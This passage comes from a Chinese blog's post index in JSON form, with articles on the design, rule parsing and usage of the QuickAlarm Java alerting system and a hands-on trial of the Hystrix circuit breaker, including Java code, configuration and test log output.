报警系统QuickAlarm之报警规则解析","text":"前面两篇分别说了报警执行器和报警规则的定义及用户扩展加载，接下来就是比较核心的一块了，如何将报警规则和报警执行器关联起来，即当发生报警时，应该call哪一个报警执行器 I. 背景知识点0. 声明在正式进入之前，有必要额外声明一下，因为目前的v1版本，没有开放报警规则的自定义，也就是说，目前只支持默认的报警规则，所以接下来的主要内容将集中在 系统默认的报警规则的解析 即基于报警频率阀值，自动选择报警执行器的规则解析 1. 报警规则如果对于报警规则，依然不是很清晰的，可以阅读一下《报警系统QuickAlarm之报警规则的设定与加载》 这里简单的进行说明，系统中默认的报警规则结构为： key为报警类型（即用户执行报警时，传进来的报警类型参数） value为具体报警规则 每个报警执行器拥有一个报警频率区间，通过报警频率映射到报警执行器的区间来选择对应的AlarmExecutor，这就是系统定义的报警规则 II. 报警规则解析通过前面的报警规则的简单说明，基本上也可以捞出报警规则的解析原则了 每种报警类型，对应一个报警规则 每个报警规则中，可以有多个报警执行器 每个报警执行器都有一个对应的报警频率的阀值 根据阀值对所有的报警执行器排序 计算报警频率，映射到哪个区间，则选择哪个报警执行器 上面是一个简单的解析规则，当然实际上和这个差不多，但有一些问题需要额外注意 只想选择一种报警方式，是否可以支持？ 多重报警方式同时调用怎么处理？（如我希望用短信提示说有问题，同时用邮件包含详细的异常堆栈） 频率限制 报警类型没有设置报警规则如何处理？ 报警规则中使用了一个未注册的报警执行器会怎样？ 1. 实现方案说明再次将报警规则类拿出来看一下 12345678910111213141516171819202122232425262728293031323334/** * 报警用户 */private List&lt;String&gt; users;/** * 报警的阀值 */private List&lt;AlarmThreshold&gt; alarmThreshold;/** * 最小的报警数 */private int minLimit;/** * 最大的报警数 */private int maxLimit;/** * 报警类型 {@link IExecute#getName()} */private String alarmLevel;/** * true 表示当报警超过当前的阀值之后, 将提升报警的程度 */private boolean autoIncEmergency; 针对上面的问题，逐一说明 首先是 autoIncEmergency 这个参数，如果为true，则表示可以走上面的哪个区间映射的规则；否则就全部走AlarmConfig中默认的报警类型了 minLimit : 表示发生报警的频率下限值，小于这个值就不会执行具体的报警逻辑 maxLimit : 最大的报警频率，超过了也不报警（简单的频率控制） alarmLevel: 对应的就是具体的报警类型 alarmThreshold: 这个只有在autoIncEmergency=true时，才有小，也就是我们前面说的不同的报警执行器，根据阀值区间进行排序，开启之后，遍历，判断频率是否在这个区间内，若在，则表示可以选择它了 如果不存在报警规则，则采用默认的兜底规则 若报警执行器也不存在，就直接采用系统定义的日志报警执行器 2. 实现基本上前面已经将整个逻辑都说了，所以实际的编码反而比较清晰了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/** * 获取具体的报警执行器 * &lt;p&gt; * 1. 未开启严重等级上升时, 直接返回 * 2. 开启之后, 判断当前的计数 范围 * * @param alarmConfig 报警配置项, 内部所有的参数都不可能为null */public static ExecuteHelper getExecute(final AlarmConfig alarmConfig, int count) { // 未达到报警的下限 or 超过报警的上限时 if (count &lt; alarmConfig.getMinLimit() || count &gt; alarmConfig.getMaxLimit()) { return new ExecuteHelper(SimpleExecuteFactory.getExecute(NoneExecute.NAME), alarmConfig.getUsers()); } // 未开启报警升级, 直接返回 if (!alarmConfig.isAutoIncEmergency()) { return new ExecuteHelper(SimpleExecuteFactory. getExecute(alarmConfig.getAlarmLevel()), alarmConfig.getUsers()); } // 报警等级开启上升之趋势 // 1. 获取设置的默认等级 // 2. 判断当前的报警次数, 选择对应的报警类型 // 3. 选择具体的报警类型 String defaultLevel = alarmConfig.getAlarmLevel(); String selectLevel = null; List&lt;String&gt; selectUser = alarmConfig.getUsers(); List&lt;AlarmThreshold&gt; list = alarmConfig.getAlarmThreshold(); boolean useNew = false; boolean containDefaultLevel = false; for (AlarmThreshold alarmThreshold : list) { if (Objects.equals(alarmThreshold.getAlarmLevel(), defaultLevel)) { containDefaultLevel = true; } } for (AlarmThreshold alarmThreshold : list) { // 表示当前的报警等级已经赶上默认的报警等级了, 所以要选择新的报警类型 if (Objects.equals(alarmThreshold.getAlarmLevel(), defaultLevel)) { useNew = true; } if (count &lt; alarmThreshold.getThreshold()) { break; } selectLevel = alarmThreshold.getAlarmLevel(); // 选择新的报警类型时, 需要更新报警用户 selectUser = alarmThreshold.getUsers(); } // 阀值列表中不包含默认报警类型，则根据新的来 if (!containDefaultLevel &amp;&amp; selectLevel != null) { return new ExecuteHelper(SimpleExecuteFactory.getExecute(selectLevel), selectUser); } // 如果阀值列表中包含了默认报警类型, 且已经超过默认阀值 if (useNew &amp;&amp; selectLevel != null) { return new ExecuteHelper(SimpleExecuteFactory.getExecute(selectLevel), selectUser); } else { return new ExecuteHelper(SimpleExecuteFactory.getExecute(defaultLevel), alarmConfig.getUsers()); }} 具体的实现基本和我们前面分析的一样，但有一个地方需要额外注意 默认报警阀值，可以直接决定是否需要报警 因此定义的其他报警方式的阀值，应该在默认的阀值区间内 当然AlarmThreshold中不包含默认报警方式时，优先选择阀值区间的报警方式 当然AlarmThreshold中包含默认报警方式时，根据新的规则做处理 （吐槽：上面这个实现有点绕，后面想办法规避下，搞得不太好理解了） 另外一个问题就是，上面的实现没有支持可以同时选择多个报警执行器的情况 因为考虑到后面肯定会对报警规则的定义和解析放开，所以先实现了一个简单的场景，具体的放在后面处理 III. 小结到这里报警规则和报警执行器之间的解析关系已确定，剩下的东西就简单了，一个维持报警频率计数，一个报警线程池，再加上一个对外接口的封装而言 基本上，到这里主要的核心逻辑已经完成，小结一下本系统中的核心设计理念 – 一切可自定义（当然目前差得有点远） 1. 报警执行器 通过SPI机制支持用户自定义扩展 要求 Executor 拥有唯一标识 因为报警执行器支持扩展，所以Executor的内部实现，完全可以由用户决定 2. 报警规则 目前报警规则只提供默认的基于频率区间的选择方案 报警规则通过报警执行器的name与之唯一对应，若对应不上，则选择默认执行器 报警规则的加载同样基于SPI，支持自定义，因此报警规则可以存在任何地方 报警规则加载器，提供一个报警规则变动的钩子(load()),若采用自定义的加载类，则确保规则变动时，主动回调这个方法 默认的报警规则加载类，是基于系统的配置文件实现，内部托管了文件的变动更新事件（使用commons-io实现） IV. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目: QuickAlarm 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2018/02/11/报警系统QuickAlarm之报警规则解析/"},{"title":"2. 报警系统QuickAlarm之报警执行器的设计与实现","text":"根据前面一篇总纲的博文，将整体结构划分为了四大块，本文则主要目标集中在第一块，报警执行器（AlarmExecute）的设计与加载上了 主要的关注点无外乎 定义-》加载-》实现逻辑三块了： AlarmExecute 的接口定义 如何加载用户自定义的AlarmExecute AlarmExecute的内部实现 I. AlarmExecute接口定义在定义接口之前，先来根据几个问题来加深下这个概念的理解： 1. 基础知识 说一下这个报警执行器到底是干嘛的？ 执行具体的报警逻辑（感觉说了依据废话） 因此不同的报警方式，可以选择不同的实现，这个强业务关联的逻辑可以交由适用方自己来把控 多个alarmExecute之间如何区分？ 给一个类似身份证的标识，将标识与alarmExecute绑定，则可以报警规则中，用这个标识来表示对应的报警执行器 标识要求全局唯一，否则就没法找到对应的执行器 2. 接口定义根据上面的基础知识，那么很容易给出接口的定义了 123456789101112131415161718192021public interface IExecute { /** * 报警的具体实现 * * @param users 报警用户，支持批量 * @param title 报警信息的title * @param msg 报警的主题信息 */ void sendMsg(List&lt;String&gt; users, String title, String msg); /** * 获取报警单元唯一标识 * * @return name 要求全局唯一 */ default String getName() { return ExecuteNameGenerator.genExecuteName(this.getClass()); }} 第一个方法sendMsg也就是需要使用者来实现的具体执行报警代码的核心模块了，比较清晰，其中用户是列表，因此，支持同时报警给多个用户（但是报警内容都是相同的） 第二个方法getName表示获取标识，默认给了一个实现，规则如下 获取类的 SimpleName 干掉类名后面的 Execute （如果不是以这个结尾的就不需要了） 剩下的全部转大写 实例： SmsExecute -&gt; SMS; LogExecute -&gt; LOG; 3. 额外说明上面接口定义中的sendMsg中，支持给多个用户发送报警信息，如果要求每个报警信息都不同，比如最常见的是: 发送一段文本，其中通知人地方根据报警人来替换，其他的不变 当然这样的场景完全可以自己在实现中来做 传入的content作为一个话术模板 然后利用 String#format() 来实现参数代替 当然更激进一点就是，穿进来的title或者content作为一个key，然后我可以通过这个key，到其他的地方（如db，缓存等）获取报警内容，甚至我连传进来的报警人都不care，直接从其他地方来获取 简单来说，这个实现委托给用户自己实现，你完全可以随意的控制，做任何你想做的事情 II. AlarmExecute的加载1. 问题分析加载AlarmExecut，貌似没有什么特别复杂的东西，一般的思路是创建一个简单工厂类，然后实例化对应的Executor返回，（再多一点确保只有一个实例对象，加以缓存） 这样有什么问题？ 很简单的实现，但是我们需要加载用户自定义的执行器，要怎么支持呢？ 几种可行的解决手段 1. 开放一个注册接口这个可算是最容易想到的了，直接让用户把自己的Executor实例，主动的扔进来 2. 抽象工厂将前面说的简单工厂，改成抽象工厂类，让后具体的加载委托给用户自己来做 3. 借助Spring容器来加载如果所有的AlarmExecute都委托给Spring容器来管理，那么就很简单了，直接通过ApplicationContext#getBean来获取所有的执行器即可 4. SPI加载方式通过JDK的spi机制来实现（详细后面来说） 针对上面的几个手段，首先排除掉前面两个，因为不满足我们的设计目标一： 简单 （只有报警这个接口进行交互，不需要额外的接口调用） 然后也排除掉spring容器，因为我们希望这个东西，可以较独立的被引用到java工程中，后面可以看情况实现一个spring版 从使用来讲，由spring容器来托管的方式，对使用者而言，是最简单，成本最低的，因为不需要额外添加SPI配置 2. 实现我们采用SPI方式来实现加载，对于SPI是什么东西，这里不详细展看，有兴趣的童鞋可以看我之前的一个系类博文：自定义SPI框架设计 实现方式，可说是非常简单了 1234567891011121314151617181920212223242526272829303132333435363738394041public class SimpleExecuteFactory { private static Map&lt;String, IExecute&gt; cacheMap; private static void loadAlarmExecute() { Map&lt;String, IExecute&gt; map = new HashMap&lt;&gt;(); Iterator&lt;IExecute&gt; iExecutes = ServiceLoader.load(IExecute.class).iterator(); IExecute tmp; while (iExecutes.hasNext()) { tmp = iExecutes.next(); if (!map.containsKey(tmp.getName())) { map.put(tmp.getName(), tmp); } else { throw new DuplicatedAlarmExecuteDefinedException( \"duplicated alarm execute defined!\" + \"\\n\" + \"&gt;&gt;name:\" + tmp.getName() + \"&gt;&gt;&gt;clz:\" + tmp.getClass() + \"&gt;&gt;&gt;clz:\" + map.get(tmp.getName()) ); } } cacheMap = map; } public static IExecute getExecute(String execute) { if (cacheMap == null) { synchronized (SimpleExecuteFactory.class) { if (cacheMap == null) { loadAlarmExecute(); } } } // 如果不存在，则降级为 LogExecute IExecute e = cacheMap.get(execute); return e == null ? cacheMap.get(LogExecute.NAME) : e; }} 上面对外就暴露一个方法，内部比较简单，如果传入标识对应的报警器没有，则返回一个默认的，确保不会因此挂掉 通过SPI加载所有的执行器的逻辑就一行 1Iterator&lt;IExecute&gt; iExecutes = ServiceLoader.load(IExecute.class).iterator(); 然后需要关注的是循环内部，做了name的唯一性判断，不满足就直接抛出异常了 III. AlarmExecute内部实现内部提供了两个基本的报警实现，比较简单 日志报警执行器 123456789101112131415/** * 有些报警,不需要立即上报,但是希望计数, 当大量出现时, 用于升级 * &lt;p/&gt; * Created by yihui on 2017/4/28. */public class LogExecute implements IExecute { public static final String NAME = ExecuteNameGenerator.genExecuteName(LogExecute.class); private static final Logger logger = LoggerFactory.getLogger(\"alarm\"); @Override public void sendMsg(List&lt;String&gt; users, String title, String msg) { logger.info(\"Do send msg by {} to user:{}, title: {}, msg: {}\", getName(), users, title, msg); }} 空报警执行器 12345678910111213/** * 空报警执行器, 什么都不干 * &lt;p&gt; * Created by yihui on 2017/5/12. */public class NoneExecute implements IExecute { public static final String NAME = ExecuteNameGenerator.genExecuteName(NoneExecute.class); @Override public void sendMsg(List&lt;String&gt; users, String title, String msg) { }} IV. 小结AlarmExecute 的定义，加载以及实现规则目前都已经完成 定义：两个方法，一个执行报警方法，一个返回唯一标识方法 加载：通过SPI方式加载所有定义的alarmExecute 实现：由用户自定义实现IExecute接口，内部逻辑无任务特殊要求，只是需要确保每个executor的name唯一 整个系统的第一步已经迈出，但是有个问题就是什么时候，才会来调用 com.hust.hui.alarm.core.execut.SimpleExecuteFactory#getExecute 从而触发执行器的加载呢？ V. 其他相关博文 报警系统QuickAlarm总纲 报警系统QuickAlarm之报警执行器的设计与实现 报警系统QuickAlarm之报警规则的设定与加载 报警系统QuickAlarm之报警规则解析 报警系统QuickAlarm之频率统计及接口封装 报警系统QuickAlarm使用手册 报警系统QuickAlarm之默认报警规则扩展 项目 项目地址： Quick-Alarm 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注，java分享","link":"/hexblog/2018/02/09/报警系统QuickAlarm之报警执行器的设计与实现/"},{"title":"熔断Hystrix使用尝鲜","text":"熔断Hystrix使用尝鲜当服务有较多外部依赖时，如果其中某个服务的不可用，导致整个集群会受到影响（比如超时，导致大量的请求被阻塞，从而导致外部请求无法进来），这种情况下采用hystrix就很有用了 出于这个目的，了解了下hystrix框架，下面记录下，框架尝新的历程 I. 原理探究通过官网和相关博文，可以简单的说一下这个工作机制，大致流程如下 首先是请求过来 -&gt; 判断熔断器是否开 -&gt; 服务调用 -&gt; 异常则走fallback，失败计数+1 -&gt; 结束 下面是主流程图 12345678910graph LR A(请求)--&gt;B{熔断器是否已开} B --&gt; | 熔断 | D[fallback逻辑] B --&gt; | 未熔断 | E[线程池/Semphore] E --&gt; F{线程池满/无可用信号量} F --&gt; | yes | D F --&gt; | no | G{创建线程执行/本线程运行} G --&gt; | yes | I(结束) G --&gt; | no | D D --&gt; I(结束) 熔断机制主要提供了两种，一个是基于线程池的隔离方式来做；还有一个则是根据信号量的抢占来做 线程池方式 ： 支持异步，支持超时设置，支持限流 信号量方式 ： 本线程执行，无异步，无超时，支持限流，消耗更小 基本上有上面这个简单的概念之后，开始进入我们的使用测试流程 II. 使用尝鲜1. 引入依赖12345&lt;dependency&gt; &lt;groupId&gt;com.netflix.hystrix&lt;/groupId&gt; &lt;artifactId&gt;hystrix-core&lt;/artifactId&gt; &lt;version&gt;1.5.12&lt;/version&gt;&lt;/dependency&gt; 2. 简单使用从官方文档来看，支持两种Command方式，一个是基于观察者模式的ObserverCommand, 一个是基本的Command，先用简单的看以下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091public class HystrixConfigTest extends HystrixCommand&lt;String&gt; { private final String name; public HystrixConfigTest(String name, boolean ans) {// 注意的是同一个任务， super(Setter.withGroupKey(// CommandGroup是每个命令最少配置的必选参数，在不指定ThreadPoolKey的情况下，字面值用于对不同依赖的线程池/信号区分 HystrixCommandGroupKey.Factory.asKey(\"CircuitBreakerTestGroup\"))// 每个CommandKey代表一个依赖抽象,相同的依赖要使用相同的CommandKey名称。依赖隔离的根本就是对相同CommandKey的依赖做隔离. .andCommandKey(HystrixCommandKey.Factory.asKey(\"CircuitBreakerTestKey_\" + ans))// 当对同一业务依赖做隔离时使用CommandGroup做区分,但是对同一依赖的不同远程调用如(一个是redis 一个是http),可以使用HystrixThreadPoolKey做隔离区分 .andThreadPoolKey(HystrixThreadPoolKey.Factory.asKey(\"CircuitBreakerTest_\" + ans)) .andThreadPoolPropertiesDefaults( // 配置线程池 HystrixThreadPoolProperties.Setter() .withCoreSize(12) // 配置线程池里的线程数，设置足够多线程，以防未熔断却打满threadpool ) .andCommandPropertiesDefaults( // 配置熔断器 HystrixCommandProperties.Setter() .withCircuitBreakerEnabled(true) .withCircuitBreakerRequestVolumeThreshold(3) .withCircuitBreakerErrorThresholdPercentage(80)// .withCircuitBreakerForceOpen(true) // 置为true时，所有请求都将被拒绝，直接到fallback// .withCircuitBreakerForceClosed(true) // 置为true时，将忽略错误// .withExecutionIsolationStrategy(HystrixCommandProperties.ExecutionIsolationStrategy.SEMAPHORE) // 信号量隔离 .withExecutionIsolationSemaphoreMaxConcurrentRequests(20) .withExecutionTimeoutEnabled(true) .withExecutionTimeoutInMilliseconds(200) .withCircuitBreakerSleepWindowInMilliseconds(1000) //熔断器打开到关闭的时间窗长度// .withExecutionTimeoutInMilliseconds(5000) ) ); this.name = name; } @Override protected String run() throws Exception { System.out.println(\"running run():\" + name + \" thread: \" + Thread.currentThread().getName()); int num = Integer.valueOf(name); if (num % 2 == 0 &amp;&amp; num &lt; 10) { // 直接返回 return name; } else if (num &lt; 40) { Thread.sleep(300); return \"sleep+\"+ name; } else { // 无限循环模拟超时 return name; } }//// @Override// protected String getFallback() {// Throwable t = this.getExecutionException();// if(t instanceof HystrixRuntimeException) {// System.out.println(Thread.currentThread() + \" --&gt; \" + ((HystrixRuntimeException) t).getFailureType());// } else if (t instanceof HystrixTimeoutException) {// System.out.println(t.getCause());// } else {// t.printStackTrace();// }// System.out.println(Thread.currentThread() + \" --&gt; ----------over------------\");// return \"CircuitBreaker fallback: \" + name;// } public static class UnitTest { @Test public void testSynchronous() throws IOException, InterruptedException { for (int i = 0; i &lt; 50; i++) { if (i == 41) { Thread.sleep(2000); } try { System.out.println(\"===========\" + new HystrixConfigTest(String.valueOf(i), i % 2 == 0).execute()); } catch (HystrixRuntimeException e) { System.out.println(i + \" : \" + e.getFailureType() + \" &gt;&gt;&gt;&gt; \" + e.getCause() + \" &lt;&lt;&lt;&lt;&lt;\"); } catch (Exception e) { System.out.println(\"run()抛出HystrixBadRequestException时，被捕获到这里\" + e.getCause()); } } System.out.println(\"------开始打印现有线程---------\"); Map&lt;Thread, StackTraceElement[]&gt; map = Thread.getAllStackTraces(); for (Thread thread : map.keySet()) { System.out.println(\"---&gt;name--&gt;\" + thread.getName()); } System.out.println(\"thread num: \" + map.size()); System.in.read(); } }} 使用起来还是比较简单的，一般步骤如下： 继承 HsytrixCommand 类 重载构造方法，内部需要指定各种配置 实现run方法，这个里面主要执行熔断监控的方法 写上面的代码比较简单，但是有几个地方不太好处理 配置项的具体含义，又是怎么生效的？ 某些异常不进入熔断逻辑怎么办？ 监控数据如何获取？ 如何模拟各种不同的case（超时？服务异常？熔断已开启？线程池满？无可用信号量？半熔断的重试？） 3. 实测理解根据上面那一段代码的删删改改，貌似理解了以下几个点，不知道对误 a. 配置相关 groupKey 用于区分线程池和信号量，即一个group对应一个 commandKey 很重要，这个是用于区分业务 简单来讲，group类似提供服务的app，command则对应app提供的service，一个app可以有多个service，这里就是将一个app的所有请求都放在一个线程池（or共享一个信号量） 开启熔断机制，指定触发熔断的最小请求数（10s内），指定打开熔断的条件（失败率） 设置熔断策略（线程池or信号量） 设置重试时间（默认熔断开启后5s，放几个请求进去，看服务是否恢复） 设置线程池大小，设置信号量大小，设置队列大小 设置超时时间，设置允许超时设置 b. 使用相关run方法是核心执行服务调用，如果需要某些服务不统计到熔断的失败率（比如因为调用姿势不对导致服务内部的异常抛上来了，但是服务本身是正常的），这个时候，就需要包装下调用逻辑，将不需要的异常包装到 HystrixBadRequestException 类里 如 12345678910111213@Overrideprotected String run() { try { return func.apply(route, parameterDescs); } catch (Exception e) { if (exceptionExcept(e)) { // 如果是不关注的异常case， 不进入熔断逻辑 throw new HystrixBadRequestException(\"unexpected exception!\", e); } else { throw e; } }} c. 如何获取失败的原因当发生失败时，hystrix会把原生的异常包装到 HystrixRuntimeException 这个类里，所以我们可以在调用的地方如下处理 1234567try { System.out.println(\"===========\" + new HystrixConfigTest(String.valueOf(i), i % 2 == 0).execute());} catch (HystrixRuntimeException e) { System.out.println(i + \" : \" + e.getFailureType() + \" &gt;&gt;&gt;&gt; \" + e.getCause() + \" &lt;&lt;&lt;&lt;&lt;\");} catch (Exception e) { System.out.println(\"run()抛出HystrixBadRequestException时，被捕获到这里\" + e.getCause());} 当定义了fallback逻辑时，异常则不会抛到具体的调用方，所以在 fallback 方法内，则有必要获取对应的异常信息 12// 获取异常信息Throwable t = this.getExecutionException(); 然后下一步就是需要获取对应的异常原因了，通过FailureType来表明失败的根源 1((HystrixRuntimeException) t).getFailureType() d.如何获取统计信息hystrix自己提供了一套监控插件，基本上公司内都会有自己的监控统计信息，因此需要对这个数据进行和自定义，目前还没看到可以如何优雅的处理这些统计信息 4. 小结主要是看了下这个东西可以怎么玩，整个用下来的感觉就是，设计的比较有意思，但是配置参数太多，很多都没有完全摸透 其次就是一些特殊的case（如监控，报警，特殊情况过滤）需要处理时，用起来并不是很顺手，主要问题还是没有理解清楚这个框架的内部工作机制的问题 III. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/15/熔断Hystrix使用尝鲜/"},{"title":"6. 报警系统QuickAlarm使用手册","text":"本文将主要说明QuickAlarm该如何使用，以及使用时需要注意事项 1. 基本使用姿势首先我们不做任何的自定义操作，全部依靠系统默认的实现，我们的使用步骤如下 1. 添加注册文件首先在项目的资源目录下，添加注册文件 alarm.properties，文件内容如下 12345678910111213## 应用名，必填appName=test## 报警规则文件所在的路径，如果采用系统默认加载方式，必填## / 开头，表示存的是绝对路径## 非/开头，表示存的是系统相对路径，一般是放在资源目录下alarmConfPath=/tmp/alarmConfig## 最大的报警类型，非必填maxAlarmType=1000## 默认报警用户，必填defaultAlarmUsers=yihui 具体存放的位置，可以参考下图，放在resources目录下（源码中，是放在测试资源目录下的） 2. 添加报警规则根据注册文件中指定的路径，设置报警规则文件，如我们的报警规则文件 内容为json串格式，支持格式化的json串解析，为了节省篇幅，下面压缩成一行，点击获取json格式化小工具 /tmp/alarmConig: 1{\"default\":{\"level\":\"LOG\",\"autoIncEmergency\":true,\"max\":30,\"min\":3,\"threshold\":[{\"level\":\"SMS\",\"threshold\":20,\"users\":[\"345345345345\",\"123123123123\"]},{\"level\":\"WEIXIN\",\"threshold\":10,\"users\":[\"yihui\",\"erhui\"]},{\"level\":\"LOG\",\"threshold\":5,\"users\":[\"yihui\",\"erhui\"]}],\"users\":[\"yihui\"]},\"NPE\":{\"level\":\"WEIXIN\",\"autoIncEmergency\":false,\"max\":30,\"min\":0,\"threshold\":[{\"level\":\"SMS\",\"threshold\":20,\"users\":[\"345345345345\",\"123123123123\"]},{\"level\":\"WEIXIN\",\"threshold\":10,\"users\":[\"3h ui\",\"4hui\"]}],\"users\":[\"yihui\"]},\"XXX,YYY\":{\"level\":\"EMAIL\",\"autoIncEmergency\":true,\"max\":30,\"min\":3,\"threshold\":[{\"level\":\"SMS\",\"threshold\":20,\"users\":[\"345345345345\",\"123123123123\"]},{\"level\":\"WEIXIN\",\"threshold\":10,\"users\":[\"yihui\",\"erhui\"]},{\"level\":\"EMAIL\",\"threshold\":5,\"users\":[\"yihui@xxx.com\",\"erhui@xxx.com\"]}],\"users\":[\"yihui@xxx.com\"]}} 3. 测试类一个简单的使用测试 123456789101112@Testpublic void sendMsg() throws InterruptedException { String key = \"NPE\"; String title = \"NPE异常\"; String msg = \"出现NPE异常了!!!\"; AlarmWrapper.getInstance().sendMsg(key, title, msg); // 微信报警 // 不存在异常配置类型, 采用默认报警, 次数较小, 则直接部署出 AlarmWrapper.getInstance().sendMsg(\"zzz\", \"不存在xxx异常配置\", \"报警嗒嗒嗒嗒\"); Thread.sleep(1000);} II. 报警执行机器扩展前面的报警规则配置中，有WEIXIN, SMS, EMAIL的报警，但是系统只提供了两个NONE和LOG，所以我们可以看下如何自定义实现上面的三个 1. 实现IExecute接口邮件报警 123456public class EmailExecute extends LogExecute { @Override public void sendMsg(List&lt;String&gt; users, String title, String msg) { super.sendMsg(users, title, msg); }} 短信报警 12345678910/** * Created by yihui on 2018/2/7. */public class SmsExecute extends LogExecute { @Override public void sendMsg(List&lt;String&gt; users, String title, String msg) { super.sendMsg(users, title, msg); }} 微信报警 123456789/** * Created by yihui on 2018/2/7. */public class WeiXinExecute extends LogExecute { @Override public void sendMsg(List&lt;String&gt; users, String title, String msg) { super.sendMsg(users, title, msg); }} 说明，因为没有具体的实现，所以我们直接用日志输出来模拟，所以就都继承了LogExecute, 实际使用中，可以在上面补上相应的实现代码 2. 添加SPI定义在 resources 目录下，新增 目录：META-INF/services/ 文件：com.hust.hui.alarm.core.execut.api.IExecute 文件内容为上面几个实现类的全路径 123com.hust.hui.alarm.core.test.execute.EmailExecutecom.hust.hui.alarm.core.test.execute.SmsExecutecom.hust.hui.alarm.core.test.execute.WeiXinExecute 目录结构如： 3. 测试1234567891011121314151617181920public static void main(String[] args) throws InterruptedException { // 测试异常升级的case // 计数 [1 - 2] 默认报警（即无日志） （其中 &lt; 3 的是因为未达到下限, 采用的默认报警） // 计数 [3 - 4] 默认邮件报警（其中 &lt; 5 采用的默认报警, 与下面的区别是报警用户） // 计数 [5 - 9] 邮件报警 （大于5小于10根据上升规则,还是选择邮件报警） // 计数 [10 - 19] 微信报警 // 计数 [20 - 30] 短信报警 // 计数 [31 -] 默认报警 （超过上限, 不报警） for (int i = 0; i &lt; 40; i++) { new Thread(new Runnable() { @Override public void run() { AlarmWrapper.getInstance().sendMsg(\"YYY\", \"异常报警升级测试\"); } }).start(); } Thread.sleep(1000 * 600);} 实测输出结果如下: 1234567891011121314151617181920212223242526272818:36:28.997 [Thread-12] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 26 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-24] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 16 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-33] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com, erhui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 6 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-22] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 18 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-26] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 14 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-23] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 17 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-35] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 4 &gt;&gt;&gt; 异常报警升级测试18:36:28.997 [sms-sender1-thread-4] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 10 &gt;&gt;&gt; 异常报警升级测试18:36:28.997 [sms-sender1-thread-3] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com, erhui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 5 &gt;&gt;&gt; 异常报警升级测试18:36:28.997 [Thread-18] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 27 &gt;&gt;&gt; 异常报警升级测试18:36:28.997 [Thread-11] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 28 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-21] INFO alarm - Do send msg by WEIXIN to user:[yihui, erhui], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 19 &gt;&gt;&gt; 异常报警升级测试18:36:28.997 [sms-sender1-thread-2] INFO alarm - Do send msg by EMAIL to user:[yihui@xxx.com, erhui@xxx.com], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 9 &gt;&gt;&gt; 异常报警升级测试18:36:28.998 [Thread-14] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 24 &gt;&gt;&gt; 异常报警升级测试18:36:28.997 [Thread-10] INFO alarm - Do send msg by SMS to user:[345345345345, 123123123123], title: [test], msg: ip:172.17.13.18 &gt;&gt;&gt; key:YYY &gt;&gt;&gt; 异常数: 29 &gt;&gt;&gt; 